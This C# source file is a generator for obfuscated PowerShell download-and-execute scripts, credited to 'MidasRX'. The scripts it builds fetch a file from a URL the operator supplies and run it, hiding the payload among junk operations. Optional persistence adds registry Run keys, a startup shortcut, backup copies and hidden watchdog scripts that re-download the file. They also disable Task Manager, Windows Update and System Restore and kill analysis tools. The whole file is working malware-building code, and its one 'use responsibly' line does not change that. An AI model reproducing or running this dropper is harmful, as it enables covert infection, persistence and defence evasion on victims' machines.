using System;
using System.IO;
using System.Text;

namespace PowerShellObfuscator
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "PowerShell Obfuscator & Downloader Generator";
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("╔══════════════════════════════════════════════════════════════╗");
            Console.WriteLine("║              PowerShell Obfuscator Generator                 ║");
            Console.WriteLine("║                     By MidasRX                          ║");
            Console.WriteLine("╚══════════════════════════════════════════════════════════════╝");
            Console.ResetColor();
            Console.WriteLine();

            try
            {
                // Get URL input
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("Enter the file URL: ");
                Console.ResetColor();
                string? url = Console.ReadLine();
                
                if (string.IsNullOrWhiteSpace(url))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error: URL cannot be empty!");
                    Console.ResetColor();
                    Console.WriteLine("Press any key to exit...");
                    Console.ReadKey();
                    return;
                }

                // Get filename input
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("Enter the output filename (with extension): ");
                Console.ResetColor();
                string? filename = Console.ReadLine();
                
                if (string.IsNullOrWhiteSpace(filename))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error: Filename cannot be empty!");
                    Console.ResetColor();
                    Console.WriteLine("Press any key to exit...");
                    Console.ReadKey();
                    return;
                }

                                 // Choose execution method
                 Console.WriteLine();
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine("Choose execution method:");
                 Console.WriteLine("1. Download to %TEMP% and execute");
                 Console.WriteLine("2. Execute in memory (PowerShell scripts only)");
                 Console.WriteLine("3. Download to %TEMP%, execute, and add to startup");
                 Console.WriteLine("4. Advanced persistence (startup + process monitoring + system protection)");
                 Console.ResetColor();
                 Console.Write("Enter choice (1, 2, 3, or 4): ");
                 string? choice = Console.ReadLine();

                                 bool executeInMemory = choice == "2";
                 bool addToStartup = choice == "3";
                 bool advancedPersistence = choice == "4";
                 string fileExtension = Path.GetExtension(filename).ToLower();
                 
                 // Confirm startup option if selected
                 if (addToStartup)
                 {
                     Console.WriteLine();
                     Console.ForegroundColor = ConsoleColor.Yellow;
                     Console.WriteLine("⚠️  Startup Persistence Warning:");
                     Console.WriteLine("   This will add the file to Windows startup (registry + startup folder).");
                     Console.WriteLine("   The file will run automatically on every system boot.");
                     Console.ResetColor();
                     Console.Write("Continue with startup persistence? (y/n): ");
                     string? confirm = Console.ReadLine()?.ToLower();
                     
                     if (confirm != "y" && confirm != "yes")
                     {
                         Console.ForegroundColor = ConsoleColor.Green;
                         Console.WriteLine("✓ Startup persistence cancelled. Using regular temp execution.");
                         Console.ResetColor();
                         addToStartup = false;
                     }
                 }
                 
                 // Confirm advanced persistence option if selected
                 if (advancedPersistence)
                 {
                     Console.WriteLine();
                     Console.ForegroundColor = ConsoleColor.Red;
                     Console.WriteLine("⚠️  ADVANCED PERSISTENCE WARNING:");
                     Console.WriteLine("   This will implement advanced persistence features:");
                     Console.WriteLine("   • Startup persistence (registry + startup folder)");
                     Console.WriteLine("   • Process monitoring (restarts if killed)");
                     Console.WriteLine("   • System protection (disables reset options)");
                     Console.WriteLine("   • Anti-debugging measures");
                     Console.WriteLine("   • Multiple backup locations");
                     Console.ResetColor();
                     Console.Write("Continue with advanced persistence? (y/n): ");
                     string? confirm = Console.ReadLine()?.ToLower();
                     
                     if (confirm != "y" && confirm != "yes")
                     {
                         Console.ForegroundColor = ConsoleColor.Green;
                         Console.WriteLine("✓ Advanced persistence cancelled. Using regular temp execution.");
                         Console.ResetColor();
                         advancedPersistence = false;
                     }
                 }
                
                if (executeInMemory && fileExtension != ".ps1")
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("⚠️  Warning: In-memory execution only works with PowerShell scripts (.ps1 files).");
                    Console.WriteLine("   For executables (.exe, .dll, etc.), use temp folder execution.");
                    Console.WriteLine("   Switching to temp folder execution automatically.");
                    Console.ResetColor();
                    executeInMemory = false;
                }
                
                // Additional validation for common binary extensions
                string[] binaryExtensions = { ".exe", ".dll", ".msi", ".zip", ".rar", ".7z", ".tar", ".gz", ".bin", ".dat" };
                if (executeInMemory && binaryExtensions.Contains(fileExtension))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("⚠️  Warning: Binary files cannot be executed in memory.");
                    Console.WriteLine("   Switching to temp folder execution automatically.");
                    Console.ResetColor();
                    executeInMemory = false;
                }

                                 // Generate obfuscated PowerShell script
                 Console.WriteLine();
                 Console.ForegroundColor = ConsoleColor.Cyan;
                 Console.WriteLine("Generating obfuscated PowerShell script...");
                 Console.ResetColor();
 
                 string obfuscatedScript = GenerateObfuscatedScript(url, filename, executeInMemory, addToStartup, advancedPersistence);
                
                // Save to file
                string outputPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), 
                                               $"obfuscated_downloader_{DateTime.Now:yyyyMMdd_HHmmss}.ps1");
                
                File.WriteAllText(outputPath, obfuscatedScript, Encoding.UTF8);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"✓ Obfuscated script generated successfully!");
                Console.WriteLine($"✓ Saved to: {outputPath}");
                Console.ResetColor();
                Console.WriteLine();
                Console.WriteLine("Script features:");
                Console.WriteLine("• 100+ useless operations for obfuscation");
                Console.WriteLine("• Hidden payload buried in the middle");
                Console.WriteLine("• Character-based command obfuscation");
                Console.WriteLine("• One-liner format for easy copying");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("⚠️  Warning: Use responsibly and only on systems you own or have permission to test.");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Error: {ex.Message}");
                Console.ResetColor();
            }

            Console.WriteLine();
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

                 static string GenerateObfuscatedScript(string url, string filename, bool executeInMemory, bool addToStartup, bool advancedPersistence)
         {
             var sb = new StringBuilder();
             
             // Generate 50+ useless operations before the payload
             sb.Append(GenerateUselessOperations(50));
             
             // Add the hidden payload
             sb.Append("; ");
             if (executeInMemory)
             {
                 sb.Append(GenerateInMemoryPayload(url));
             }
             else if (advancedPersistence)
             {
                 sb.Append(GenerateAdvancedPersistencePayload(url, filename));
             }
             else if (addToStartup)
             {
                 sb.Append(GenerateStartupPayload(url, filename));
             }
             else
             {
                 sb.Append(GenerateTempFilePayload(url, filename));
             }
             
             // Generate 50+ more useless operations after the payload
             sb.Append("; ");
             sb.Append(GenerateUselessOperations(50));
             
             return sb.ToString();
         }

        static string GenerateUselessOperations(int count)
        {
            var operations = new[]
            {
                "$randomVar{0} = Get-Random -Minimum 1 -Maximum 1000",
                "$string{0} = \"abcdefghijklmnopqrstuvwxyz\" * 3",
                "$date{0} = Get-Date",
                "$guid{0} = [System.Guid]::NewGuid()",
                "$math{0} = [Math]::Sqrt({1}) * [Math]::PI",
                "$array{0} = @(1,2,3,4,5) | ForEach-Object {{ $_ * 2 }}",
                "$hash{0} = @{{ \"key{0}\" = \"value{0}\" }}",
                "$split{0} = \"one,two,three\".Split(',')",
                "$join{0} = @(\"a\",\"b\",\"c\") -join \"-\"",
                "$trim{0} = \"  spaces  \".Trim()",
                "$replace{0} = \"hello world\".Replace(\"world\", \"universe\")",
                "$substring{0} = \"PowerShell\".Substring(0, 5)",
                "$length{0} = \"test\".Length",
                "$check{0} = \"PowerShell\" -like \"Power*\"",
                "$case{0} = \"TEST\" -ceq \"test\"",
                "$greater{0} = {1} -gt {2}",
                "$logical{0} = ($true -and $false)",
                "$null{0} = $null -eq $null",
                "$type{0} = {1} -is [int]",
                "$cast{0} = [string]{1}",
                "$measure{0} = @(1,2,3,4,5) | Measure-Object -Sum",
                "$binary{0} = [Convert]::ToString({1}, 2)",
                "$hex{0} = [Convert]::ToString({1}, 16)",
                "$base64_{0} = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"Hello{0}\"))",
                "$memory{0} = [System.IO.MemoryStream]::new()",
                "$encoding{0} = [System.Text.Encoding]::UTF8",
                "$bytes{0} = [System.Text.Encoding]::UTF8.GetBytes(\"Test{0}\")",
                "$timer{0} = [System.Diagnostics.Stopwatch]::StartNew()",
                "$list{0} = [System.Collections.Generic.List[int]]::new()",
                "$dict{0} = [System.Collections.Generic.Dictionary[string,int]]::new()"
            };

            var sb = new StringBuilder();
            var random = new Random();
            
            for (int i = 0; i < count; i++)
            {
                var operation = operations[random.Next(operations.Length)];
                var randomNum1 = random.Next(1, 1000);
                var randomNum2 = random.Next(1, 100);
                
                if (i > 0) sb.Append("; ");
                sb.Append(string.Format(operation, i, randomNum1, randomNum2));
            }
            
            return sb.ToString();
        }

        static string GenerateInMemoryPayload(string url)
        {
            // For in-memory execution - download to temp first, then execute in memory
            return ObfuscateCommand($"$tempFile = \"$env:TEMP\\temp_script.ps1\"; iwr -Uri \"{url}\" -OutFile $tempFile; if(Test-Path $tempFile) {{ iex (Get-Content $tempFile -Raw); Remove-Item $tempFile -Force }} else {{ Write-Error 'Failed to download script. Use temp folder execution instead.' }}");
        }

                 static string GenerateTempFilePayload(string url, string filename)
         {
             return ObfuscateCommand($"Invoke-WebRequest -Uri \"{url}\" -OutFile \"$env:TEMP\\{filename}\"; & \"$env:TEMP\\{filename}\"");
         }
 
         static string GenerateStartupPayload(string url, string filename)
         {
             // Download, execute, and add to startup (registry + startup folder) - One line
             return ObfuscateCommand($"$tempFile = \"$env:TEMP\\{filename}\"; iwr -Uri \"{url}\" -OutFile $tempFile; if(Test-Path $tempFile) {{ & $tempFile; $startupName = \"{Path.GetFileNameWithoutExtension(filename)}\"; Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name $startupName -Value $tempFile -ErrorAction SilentlyContinue; $startupFolder = \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"; $shortcutPath = \"$startupFolder\\$startupName.lnk\"; $WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut($shortcutPath); $Shortcut.TargetPath = $tempFile; $Shortcut.Save(); Write-Host \"Added to startup successfully.\" }} else {{ Write-Error \"Failed to download file.\" }}");
         }
 
         static string GenerateAdvancedPersistencePayload(string url, string filename)
         {
             // Advanced persistence with process monitoring, system protection, multiple backups, file monitoring, and instant Task Manager disabling - One line
             return ObfuscateCommand($"$tempFile = \"$env:TEMP\\{filename}\"; $backupFile1 = \"$env:APPDATA\\{filename}\"; $backupFile2 = \"$env:LOCALAPPDATA\\{filename}\"; $processName = \"{Path.GetFileNameWithoutExtension(filename)}\"; $downloadUrl = \"{url}\"; iwr -Uri $downloadUrl -OutFile $tempFile -ErrorAction SilentlyContinue; Copy-Item $tempFile $backupFile1 -ErrorAction SilentlyContinue; Copy-Item $tempFile $backupFile2 -ErrorAction SilentlyContinue; if(Test-Path $tempFile) {{ & $tempFile; $startupName = \"{Path.GetFileNameWithoutExtension(filename)}\"; Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name $startupName -Value $tempFile -ErrorAction SilentlyContinue; Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" -Name $startupName -Value $tempFile -ErrorAction SilentlyContinue; Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name $startupName -Value $tempFile -ErrorAction SilentlyContinue; $startupFolder = \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"; $shortcutPath = \"$startupFolder\\$startupName.lnk\"; $WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut($shortcutPath); $Shortcut.TargetPath = $tempFile; $Shortcut.Save(); try {{ Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\" -Name \"AUOptions\" -Value 1 -ErrorAction SilentlyContinue; Disable-ComputerRestore -Drive \"C:\" -ErrorAction SilentlyContinue; Set-Service -Name \"wuauserv\" -StartupType Disabled -ErrorAction SilentlyContinue; Stop-Service -Name \"wuauserv\" -Force -ErrorAction SilentlyContinue; Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value 1 -ErrorAction SilentlyContinue; Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value 1 -ErrorAction SilentlyContinue }} catch {{ }}; $monitorScript = 'while($true) {{ $process = Get-Process -Name \"$processName\" -ErrorAction SilentlyContinue; if(-not $process) {{ Start-Process \"$tempFile\" -WindowStyle Hidden; Start-Sleep 5 }} Start-Sleep 10 }}'; $monitorFile = \"$env:TEMP\\monitor.ps1\"; $monitorScript | Out-File $monitorFile -Encoding ASCII; Start-Process powershell -ArgumentList \"-WindowStyle Hidden -ExecutionPolicy Bypass -File $monitorFile\" -WindowStyle Hidden; $fileMonitorScript = 'while($true) {{ if(-not (Test-Path \"$tempFile\")) {{ iwr -Uri \"$downloadUrl\" -OutFile \"$tempFile\" -ErrorAction SilentlyContinue; if(Test-Path \"$tempFile\") {{ & \"$tempFile\"; $startupName = \"{Path.GetFileNameWithoutExtension(filename)}\"; Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name $startupName -Value \"$tempFile\" -ErrorAction SilentlyContinue; Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" -Name $startupName -Value \"$tempFile\" -ErrorAction SilentlyContinue; Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name $startupName -Value \"$tempFile\" -ErrorAction SilentlyContinue; Copy-Item \"$tempFile\" \"$backupFile1\" -ErrorAction SilentlyContinue; Copy-Item \"$tempFile\" \"$backupFile2\" -ErrorAction SilentlyContinue }} }} if(-not (Test-Path \"$backupFile1\")) {{ Copy-Item \"$tempFile\" \"$backupFile1\" -ErrorAction SilentlyContinue }} if(-not (Test-Path \"$backupFile2\")) {{ Copy-Item \"$tempFile\" \"$backupFile2\" -ErrorAction SilentlyContinue }} Start-Sleep 30 }}'; $fileMonitorFile = \"$env:TEMP\\filemonitor.ps1\"; $fileMonitorScript | Out-File $fileMonitorFile -Encoding ASCII; Start-Process powershell -ArgumentList \"-WindowStyle Hidden -ExecutionPolicy Bypass -File $fileMonitorFile\" -WindowStyle Hidden; $antiDebugScript = 'while($true) {{ $suspicious = @(\"wireshark\", \"procmon\", \"processhacker\", \"taskmgr\", \"procexp\"); foreach($tool in $suspicious) {{ $proc = Get-Process -Name $tool -ErrorAction SilentlyContinue; if($proc) {{ Stop-Process -Name $tool -Force -ErrorAction SilentlyContinue }} }} Start-Sleep 30 }}'; $antiDebugFile = \"$env:TEMP\\antidebug.ps1\"; $antiDebugScript | Out-File $antiDebugFile -Encoding ASCII; Start-Process powershell -ArgumentList \"-WindowStyle Hidden -ExecutionPolicy Bypass -File $antiDebugFile\" -WindowStyle Hidden; Write-Host \"Advanced persistence activated successfully.\" }} else {{ Write-Error \"Failed to download file.\" }}");
         }

        static string ObfuscateCommand(string command)
        {
            // Split the command and obfuscate key parts
            var obfuscatedParts = new StringBuilder();
            
            // Obfuscate 'iex' or 'Invoke-Expression'
            if (command.StartsWith("iex"))
            {
                obfuscatedParts.Append("&($([char]105+[char]101+[char]120)) ");
                obfuscatedParts.Append(command.Substring(4));
            }
            else if (command.StartsWith("Invoke-WebRequest"))
            {
                // Obfuscate Invoke-WebRequest
                obfuscatedParts.Append("&($([char]73+[char]110+[char]118+[char]111+[char]107+[char]101+[char]45+[char]87+[char]101+[char]98+[char]82+[char]101+[char]113+[char]117+[char]101+[char]115+[char]116)) ");
                obfuscatedParts.Append(command.Substring(17));
            }
            else
            {
                obfuscatedParts.Append(command);
            }
            
            return obfuscatedParts.ToString();
        }
    }
}
